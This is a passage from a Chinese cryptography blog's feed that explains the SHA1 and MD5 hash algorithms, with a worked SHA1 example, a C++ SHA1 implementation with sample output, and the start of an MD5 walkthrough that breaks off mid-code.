alt="2.png"></p><p>SHA1 每运行一次步函数，A、B、C、D 的值顺序赋值给(或经过一个简单左循环移位后)B、C、D、E 寄存器。同时，A、B、C、D、E 的输人值与常数和子消息块经过<strong>步函数</strong>运算后赋值给 A。</p><ul><li><p>$A=(ROTL^5(A)+f_1(B,C,D)+E+W_t+K_r)mod2^{23}$</p></li><li><p>$B=A$</p></li><li><p>$C=ROTL^{30}(B)mod 2^{32}$</p></li><li><p>$D=C$</p></li><li><p>$E=D$</p></li></ul><p>其中,t 是步数，$0\leq t \leq 79$,(因为一共 20 * 4 = 80 步)，r 为轮数,$1 \leq r \leq 4$。</p><p>图中<strong>非线性函数</strong>输人 3 个 32 比特的变量 B、C 和 D 进行操作,产生一个 32 位的输出，其定义如下:<br><img src="https://cdn.acwing.com/media/article/image/2023/11/12/169037_12bfa8c681-3.png" alt="3.png"></p><p>图 6-6 中$K_r$是循环中使用的额外常数,其值定义如下。</p><p>$K_r$的 4 个取值分别为 2、3、5 和 10 的平方根，然后再乘以$2^{30} = 1073741824$,最后取乘积的整数部分。以计算 $K_4$为例，</p><p>$\sqrt{10} \approx 3.162 277 660 168 379 331 998 893 544 432 7$,</p><p>$\sqrt{10} \times 2^{32}= \sqrt{10} \times 1073 741 824 \approx 3 395469782.823647 771 064 393 520 381$,</p><p>最后取求积的整数部分得$(3395469782)<em>{10}=(CA62C1D6)</em>{16}$。</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/12/169037_1d5192cb81-4.png" alt="4.png"></p><p>$ROTL^n(x)$表示对 32 比特的变量 x 循环左 n 比特。</p><p>32 比特的消息字 $W_t$是从 512 比特的消息分组中导出的,其生成过程如图 6-7 所示</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/12/169037_9394b5ab81-5.png" alt="5.png"></p><p>从图 6-7 可以看出,在前 16 步处理中 $W_t$值等于消息分组中的相应字,而余下的 64 步操作中,其值是由前面的 4 个值相互异或后再循环移位得到。上述操作增加了消息比特的扩散，故对于相同长度的消息找出另一个杂凑值相同的消息会非常困难。</p><h2 id="3-样例">3. 样例</h2><p>用 SHA1 处理 ASCII 码序列“iscbupt”</p><p>解：首先将消息进行填充,填充后消息分组赋值给 16 个 32 比特的字:</p><p>$W_0=0x69736362,W_1=0x75707480,W_2=W_3=W_4=W_5=W_6=0x00000000$</p><p>$W_7=W_8=W_9=W_{10}=W_{11}=W_{12}=W_{13}=W_{14}=0x00000000,W_{15}=0x00000038$</p><blockquote><p>iscbupt 的长度为 7，共 56(&lt;64)位 bit，十六进制为$(38)_{16}$</p></blockquote><p>初始散列值为:<br>$A=0x67452301,B=0XEFCDAB89C=0x98BADCFE,D=0x10325476,E0xC3D2E1F0$</p><p>经过 80 步循环后这 5 个 32 比特的寄存器 A、B、C、D 和 E 的值如表 6-3 所示。</p><blockquote><p>用手机截的图，认为不是很重要，懒得手打了，如果要验证的话前几组数据应该就够了</p></blockquote><p><img src="https://cdn.acwing.com/media/article/image/2023/11/12/169037_fe12881381-6.png" alt="6.png"></p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/12/169037_4a4b699281-7.png" alt="7.png"></p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/12/169037_4ce99f9481-8.png" alt="8.png"></p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/12/169037_aea63ff781-9.png" alt="9.png"></p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/12/169037_bbb7488181-10.png" alt="10.png"></p><p>分组处理完毕后,5 个寄存器的值为:</p><p>$A=(0x67452301+0xFF08A6EF)mod 2^{32}=0x664DC9F0$</p><p>$B=(0xEFCDAB89+0x280E6F65)mod 2^{32}=0x17DC1AEE$</p><p>$C(0x98BADCFE+0xB18889BE)mod 2^{32}=0x4A4366BC$</p><p>$D=(0x10325476+0xEB52BD39)mod 2^{32} = 0xFB8511AF$</p><p>$E=(0xC3D2E1F0+0x04CCB240)mod2^{32}=0xC89F9430$</p><p>由此可得:</p><p>SHA1(“iscbupt”)=“664DC9F017DC1AEE4A4366BCFB8511AFC89F9430”</p><h2 id="4-C-代码">4.C++代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; X;<span class="comment">//8*64=512，每个下标存放8位</span></span><br><span class="line"><span class="type">int</span> W[<span class="number">80</span>];<span class="comment">//32位为一组</span></span><br><span class="line"><span class="type">int</span> A, B, C, D, E;</span><br><span class="line"><span class="type">int</span> A1, B1, C1, D1, E1;<span class="comment">//缓冲区寄存器,产生最后结果</span></span><br><span class="line"><span class="type">int</span> Turn;<span class="comment">//加密分组数量</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printX</span><span class="params">()</span> </span>&#123;<span class="comment">//输出填充后的文本</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; X.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, X[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">S</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x, <span class="type">int</span> n)</span> </span>&#123;<span class="comment">//循环左移</span></span><br><span class="line">    <span class="keyword">return</span> x &gt;&gt; (<span class="number">32</span> - n) | (x &lt;&lt; n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">append</span><span class="params">(string m)</span> </span>&#123;<span class="comment">//文本的填充处理</span></span><br><span class="line">    Turn = (m.<span class="built_in">size</span>() + <span class="number">8</span>) / <span class="number">64</span> + <span class="number">1</span>;</span><br><span class="line">    X.<span class="built_in">resize</span>(Turn * <span class="number">64</span>);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; m.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        X[i] = m[i];</span><br><span class="line">    &#125;</span><br><span class="line">    X[i++] = <span class="number">0x80</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; X.<span class="built_in">size</span>() - <span class="number">8</span>) &#123;</span><br><span class="line">        X[i] = <span class="number">0</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> a = m.<span class="built_in">size</span>() * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = X.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= X.<span class="built_in">size</span>() - <span class="number">8</span>; i--) &#123;</span><br><span class="line">        X[i] = a % <span class="number">256</span>;</span><br><span class="line">        a /= <span class="number">256</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setW</span><span class="params">(vector&lt;<span class="type">int</span>&gt; m, <span class="type">int</span> n)</span> </span>&#123;<span class="comment">//W数组的生成</span></span><br><span class="line">    n *= <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        W[i] = (m[n + <span class="number">4</span> * i] &lt;&lt; <span class="number">24</span>) + (m[n + <span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">            + (m[n + <span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + m[n + <span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">16</span>; i &lt; <span class="number">80</span>; i++) &#123;</span><br><span class="line">        W[i] = <span class="built_in">S</span>(W[i - <span class="number">16</span>] ^ W[i - <span class="number">14</span>] ^ W[i - <span class="number">8</span>] ^ W[i - <span class="number">3</span>], <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ft</span><span class="params">(<span class="type">int</span> t)</span> </span>&#123;<span class="comment">//ft(B,C,D)函数</span></span><br><span class="line">    <span class="keyword">if</span> (t &lt; <span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> (B &amp; C) | ((~B) &amp; D);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (t &lt; <span class="number">40</span>)</span><br><span class="line">        <span class="keyword">return</span> B ^ C ^ D;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (t &lt; <span class="number">60</span>)</span><br><span class="line">        <span class="built_in">return</span> (B &amp; C) | (B &amp; D) | (C &amp; D);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> B ^ C ^ D;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Kt</span><span class="params">(<span class="type">int</span> t)</span> </span>&#123;<span class="comment">//常量K</span></span><br><span class="line">    <span class="keyword">if</span> (t &lt; <span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x5a827999</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (t &lt; <span class="number">40</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x6ed9eba1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (t &lt; <span class="number">60</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x8f1bbcdc</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xca62c1d6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sha1</span><span class="params">(string text)</span> </span>&#123;</span><br><span class="line">    A1 = A = <span class="number">0x67452301</span>;</span><br><span class="line">    B1 = B = <span class="number">0xefcdab89</span>;</span><br><span class="line">    C1 = C = <span class="number">0x98badcfe</span>;</span><br><span class="line">    D1 = D = <span class="number">0x10325476</span>;</span><br><span class="line">    E1 = E = <span class="number">0xc3d2e1f0</span>;</span><br><span class="line">    <span class="built_in">append</span>(text);</span><br><span class="line">    <span class="comment">//printX();</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; Turn; i++) &#123;</span><br><span class="line">        <span class="built_in">setW</span>(X, i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; <span class="number">80</span>; t++) &#123;</span><br><span class="line">            <span class="type">int</span> temp = E + <span class="built_in">ft</span>(t) + <span class="built_in">S</span>(A, <span class="number">5</span>) + W[t] + <span class="built_in">Kt</span>(t);</span><br><span class="line">            E = D;</span><br><span class="line">            D = C;</span><br><span class="line">            C = <span class="built_in">S</span>(B, <span class="number">30</span>);</span><br><span class="line">            B = A;</span><br><span class="line">            A = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        A1 = A = A + A1;</span><br><span class="line">        B1 = B = B + B1;</span><br><span class="line">        C1 = C = C + C1;</span><br><span class="line">        D1 = D = D + D1;</span><br><span class="line">        E1 = E = E + E1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x%08x%08x%08x%08x\n\n&quot;</span>, A1, B1, C1, D1, E1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;----------------- SHA1 -----------------\n&quot;</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入要加密的明文. (如果要终止程序请按CTRL + C)\n&quot;</span>;</span><br><span class="line">    string text;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; text;</span><br><span class="line">        <span class="built_in">sha1</span>(text);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----------------- SHA1 -----------------</span><br><span class="line">请输入要加密的明文. (如果要终止程序请按CTRL + C)</span><br><span class="line">iscbuty</span><br><span class="line">c479655fcf8bb57268768a25dd4ad608bc3e36aa</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">SHA1算法加解密原理及C++代码</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="Hash算法" scheme="https://nonevector.top/tags/Hash%E7%AE%97%E6%B3%95/"/>
    
    <category term="SHA1算法" scheme="https://nonevector.top/tags/SHA1%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Hash算法之MD5算法</title>
    <link href="https://nonevector.top/posts/11.html"/>
    <id>https://nonevector.top/posts/11.html</id>
    <published>2023-11-11T01:30:25.130Z</published>
    <updated>2023-11-29T03:35:40.229Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hash-函数结构">Hash 函数结构</h2><p><code>Hash</code> 函数的一般结构如图<code>6-1</code>所示,称为<strong>Hash 函数迭代结构</strong>，也称为<strong>MD 结构</strong>。它由 Merkle 和 Damgard 分别独立提出,包括 MD5,SHA1 等目前所广泛使用的大多数 Hash 函数都采用这种结构。MD 结构将输人消息分为<code>L</code>个固定长度的分组,每一分组长为<code>b</code>位,最后一个分组包含输入消息的总长度,若最后一个分组不足<code>b</code>位时,需要将其填充为<code>b</code>位。由于输人包含消息的长度,所以攻击者必须找出具有相同散列值且长度相等的两条消息,或者找出两条长度不等但加入消息长度后散列值相同的消息,从而增加了攻击的难度。</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_931668de80-1.png" alt="1.png"></p><p>迭代结构包含一个压缩函数<code>f</code>。压缩函数<code>f</code>有两个输入:一个是前一次迭代的<code>n</code> 位输出,称为链接变量;另一个是消息的<code>b</code>位分组，并产生一个<code> n</code> 位的输出。因为一般来说消息分组长度<code>b</code>大于输出长度<code>n</code>,因此称之为压缩函数。第一次迭代输入的链接变量又称为初值变量,由具体算法指定,最后一次迭代的输出即为散列值。</p><h2 id="MD5-算法">MD5 算法</h2><p><code>MD5</code> 算法是美国麻省理工学院著名密码学家 Rivest 设计的,MD(Message Digest)是消息摘要的意思。Rivest 于 1992 年向 IETF 提交的 RFC1321 中对 <code>MD5</code>作了详尽的述 MD5 是在<code>MD2</code>、<code>MD3</code>和<code>MD4 </code>基础上发展而来的,尤其在<code> MD4</code> 上增加了 <code>Safety-Belts</code>,所以<code>MD5</code> 又被称为是“系有安全带的 MD4”,它虽然比<code>MD4</code> 要稍慢一些,但更为安全。</p><h2 id="1-MD5-算法描述">1. MD5 算法描述</h2><p><code>MD5</code>算法的输人是长度小于$2^{64}$比特的消息,输出为 <code>128</code> 比特的消息摘要。输人消息以<code>512</code> 比特的分组为单位处理,其流程如下:</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_502e74a680-2.png" alt="2.png"></p><p><code>L</code>为消息的长度;<code>N</code> 为消息扩充后分组个数:$Y_i(0 \leq i \leq N-1)$代表一个分组;<code>IV</code>表示初始链接变量,<code>A、B、C、D</code>是<code>4</code>个<code>32</code>位的寄存器;$CV_i$是链接变量,即是第<code>i</code>个分组处理单元的输出，也是第 <code>i+1</code> 个分组处理单元的输人,最后单元的输出$ CV_N$ 即是消息的散列值。</p><p>主要流程概括起来便是：消息预处理, 初始化缓冲区, 循环哈希，下面会依次介绍</p><h2 id="2-MD5-具体流程">2.MD5 具体流程</h2><h3 id="1-消息预处理">1. 消息预处理</h3><ol><li><p>附加补充位</p><p>在长度为 <code>K bits</code> 的原始消息数据尾部填充长度为<code>P bits</code>的标识<code>100…0</code>，$1 \leq P  \leq 512 $(即至少要填充1个bit)，使得填充后的消息位数为：$K + P \equiv 448 (mod 512).$</p><blockquote><p>注意到当 $K \equiv 448 (mod 512) $时，需要 P= 512.</p></blockquote></li><li><p>附加信息</p><p>原始消息<strong>长度</strong>（注意是长度）以 64 比特表示附加在填充结果的后面，最后得到一个长度位数为 $K + P + 64 \equiv 0 (mod 512) $的消息。</p><p>原因: 增加攻击者伪造明文的难度. 伪造信息的长度必需要与原文长度相等(其实是同余)</p><p>将消息长度 $Length(M)(mod2^{64})$ 以<strong>小端序</strong>的形式附加到第一步预留的 64-bit 空间中.</p><blockquote><p>后面会讲小端序和大端序</p></blockquote></li></ol><p>按以上步骤处理完消息之后, 将最后的得到的消息结果分割成 L 个 512-bit 分组：$Y_0, Y_1, \ldots ,Y_{L - 1}$</p><p>分组结果按<code> 32-bit</code> 一组, 被分为 16 组字(Word) (512 = 32 * 16)，$M_0[0],M_0[1],\ldots,M_0[15],M_1[0]\ldots, M_{L - 1}[16]$,在本文中被记作 $M_i[j]$,其中<code>j</code>表示字的组数.</p><h3 id="2-初始化缓冲区">2.初始化缓冲区</h3><p>算法使用 <code>128-bit</code> 的缓冲区存放中间结果和最终哈希值, <code>128-bit </code>可以看做 <code>4 </code>组<code>32-bit</code>字所占的比特位(128 = 4 * 32)</p><p>被记作 $Buffer_A,Buffer_B,Buffer_C,Buffer_D$. 每个缓冲区都以<strong>小端序</strong>的方式存储数据. 将 4 块 Buffer 组合起来记为链接向量$ CV_i$</p><p>$$<br>CV_i=CV_{i−1}<br>$$</p><p>$CV_0$ 被规定为常量, 如下表格所示.(在最上面的流程图里面现实的$IV$)，即 A、B、C、D 的值分别为 0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476）</p><blockquote><p>每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序</p><p>注意一个存储单元可以存储两位，当然也是一个字</p></blockquote><table><thead><tr><th><strong>字节序</strong></th><th>存储内容</th></tr></thead><tbody><tr><td>小端序</td><td>Buffer[4] = {0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210};</td></tr><tr><td>大端序</td><td>Buffer[4] = {0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476};</td></tr></tbody></table><h3 id="3-循环哈希">3.循环哈希</h3><p>调用 $H_{MD5}(M_i,CV_i)$ 函数对每组消息分组进行哈希计算.</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_c8fab24e80-3.png" alt="3.png"></p><p>每一次$ H_{MD5}()$ 中有 4 轮结构相同的逻辑函数, 不同轮次间的唯一区别是参与计算的逻辑函数不同, 分别表示为 F、G、H、I.</p><blockquote><p>下面步函数会介绍 F、G、H、I</p></blockquote><p>此外, $H_{MD5}()$ 还有一个常数表 T, 常数表 T 为定义为 $T[i]=[2^{32} \times abs(sin(i))]=[4294967296 \times abs(sin(i))],1 \leq i \leq 64$ (前 32-bit 小数.) (i 是弧度),如$T[28]=[4294967296 \times abs(sin(28))]  \approx [1163531501.079 3967247]$,然后其整数部分转化为十六进制$T[28]=(1163531501)<em>{10}=(455A14ED)</em>{16}$。T[i]是一个伪随机的常数,可以消除输入数据的规律性,其详细取值见表 6-1。</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_255b34d680-4.png" alt="4.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//常熟T[i](i = 1,...,64)</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> T[<span class="number">64</span>] = &#123;</span><br><span class="line"><span class="number">0xd76aa478</span>, <span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>, <span class="number">0xc1bdceee</span>, <span class="number">0xf57c0faf</span>, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>, <span class="number">0xfd469501</span>,</span><br><span class="line"><span class="number">0x698098d8</span>, <span class="number">0x8b44f7af</span>, <span class="number">0xffff5bb1</span>, <span class="number">0x895cd7be</span>, <span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>, <span class="number">0xa679438e</span>, <span class="number">0x49b40821</span>,</span><br><span class="line"><span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>, <span class="number">0xe9b6c7aa</span>, <span class="number">0xd62f105d</span>, <span class="number">0x2441453</span>, <span class="number">0xd8a1e681</span>, <span class="number">0xe7d3fbc8</span>,</span><br><span class="line"><span class="number">0x21e1cde6</span>, <span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455a14ed</span>, <span class="number">0xa9e3e905</span>, <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span>,</span><br><span class="line"><span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>, <span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span>, <span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>, <span class="number">0xf6bb4b60</span>, <span class="number">0xbebfbc70</span>,</span><br><span class="line"><span class="number">0x289b7ec6</span>, <span class="number">0xeaa127fa</span>, <span class="number">0xd4ef3085</span>, <span class="number">0x4881d05</span>, <span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0x1fa27cf8</span>, <span class="number">0xc4ac5665</span>,</span><br><span class="line"><span class="number">0xf4292244</span>, <span class="number">0x432aff97</span>, <span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span>, <span class="number">0x655b59c3</span>, <span class="number">0x8f0ccc92</span>, <span class="number">0xffeff47d</span>, <span class="number">0x85845dd1</span>,</span><br><span class="line"><span class="number">0x6fa87e4f</span>, <span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>, <span class="number">0x4e0811a1</span>, <span class="number">0xf7537e82</span>, <span class="number">0xbd3af235</span>, <span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span>&#125;;</span><br></pre></td></tr></table></figure><p>在本文中把 $H_{MD5}$ 的轮函数记为 $R(M_i,Buffer,T[],function_i())$. 其中, 轮函数每次调用是都会读取缓存区中的数据. 而且不同轮次之间所调用的逻辑函数也是不一样的. 此外, 每一次调用轮函数会用到不同 16 组 T 元素(对应轮函数内部的中 16 次迭代).</p><p>$H_{MD5}()$ 完成第四轮轮函数处理之后, 将得到的结果和输入的$ CV<em>i$按字(每 32-bit) 分组按位<strong>加</strong>. 得到最终输出结果$ CV</em>{i+1}$.</p><h2 id="3-轮函数-压缩函数-的具体实现">3.轮函数(压缩函数)的具体实现</h2><p><code>MD5</code>算法的分组处理(压缩函数)与分组密码的分组处理相似,如图 6-3 所示。它由<code>4</code>轮组成,<code>512</code>比特的消息分组<code>M</code>被均分为<code>16</code>个子分组(每个子分组为 <code>32</code>比特)参与每轮<code>16</code>步函数运算，即每轮包括<code>16 </code>个步骤。每步的输人是<code>4</code>个 <code>32</code>比特的链接变量和一个<code>32</code>比特的消息子分组,输出为<code>32</code>位值。经过<code>4</code>轮共<code> 64</code> 步后,得到的个存器值分别与输人链接变量进行模加，即得到此次分组处理的输出链接变量。<br><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_4bc6f6f080-6.png" alt="6.png"><br><code>4</code> 轮操作开始前,先将前一分组的链接变量(A、BC 和 D 的值)复制到另外 4 个备用记录单元<code>AA、BB、CC和DD</code>,以便执行最后的模加运算。</p><p>轮函数每次调用内部有 <code>16</code> 次迭代计算, 将轮函数当前迭代的次数记作 <code>i</code></p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_a200320480-5.png" alt="5.png"></p><p>读取缓冲区中的数据, 将缓冲区按字<code> 32-bit</code> 分为<code>4</code>组, 记作 <code>A、B、C、D</code></p><ul><li><p>第一步</p><p>BCD 暂时不动, A 有以下 x 层计算:</p><ul><li><p>$A+Logic_Function_{轮数}(B,C,D)$</p><p>$F(b,c,d)=(b∧c)∨(\overline b∧d)$</p><p>$G(b,c,d)=(b∧d)∨(c∧\overline d)$</p><p>$H(b,c,d)=b⊕c⊕d$</p><p>$I(b,c,d)=c⊕(b∨\overline d)$</p></li><li><p>$A+M_i[k]$ (k 受到当前轮数以及迭代次数 i 的影响)</p></li><li><p>$A+T[i]$ (受到输入影响, 与当前轮数有关)</p><p>$ρ_1(i)=i$</p><p>$ρ_2(i)=(1+5i)mod16$</p><p>$ρ_3(i)=(5+3i)mod16$</p><p>$ρ_4(i)=7imod16$</p></li><li><p>A <strong>循环</strong>(注意是循环）左移 s 位 (s 由一个常量表给出)</p><blockquote><p>s[ 1…16] = { 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22 }<br>s[17…32] = { 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20 }<br>s[33…48] = { 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23 }<br>s[49…64] = { 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21 }</p></blockquote></li><li><p>A + B</p></li></ul></li><li><p>第二步</p><p>对缓冲区中的四个字按字右循环位移 1 个字 即新的缓冲区$ Buffer′=D′||A′||B′||C′$</p></li></ul><p>也就是说, 一组消息的压缩要经过这样的过程:</p><ol><li><p>轮次一(F)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* [abcd k s i] a = b + ((a + F(b,c,d) + X[k] + T[i]) &lt;&lt;&lt; s). */</span></span><br><span class="line">[ABCD  <span class="number">0</span> <span class="number">7</span>  <span class="number">1</span>][DABC  <span class="number">1</span> <span class="number">12</span>  <span class="number">2</span>][CDAB  <span class="number">2</span> <span class="number">17</span>  <span class="number">3</span>][BCDA  <span class="number">3</span> <span class="number">22</span>  <span class="number">4</span>]</span><br><span class="line">[ABCD  <span class="number">4</span> <span class="number">7</span>  <span class="number">5</span>][DABC  <span class="number">5</span> <span class="number">12</span>  <span class="number">6</span>][CDAB  <span class="number">6</span> <span 